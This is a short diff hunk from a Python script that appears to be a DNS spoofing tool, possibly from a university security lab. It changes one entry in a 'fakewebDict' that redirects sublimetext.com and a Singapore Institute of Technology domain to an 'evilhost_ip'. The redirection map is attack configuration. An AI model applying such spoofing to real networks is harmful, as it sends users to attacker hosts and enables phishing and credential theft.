@@ -83,7 +83,7 @@ if __name__ == '__main__':
         # Define the website to be redirected 
         fakewebDict = {
             b"sublimetext.com.": evilhost_ip,
-            b"in4sit.singaporetech.edu.sg.": evilhost_ip
+            b"xsite.singaporetech.edu.sg.": evilhost_ip
         }
         queueCount = 1
         log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
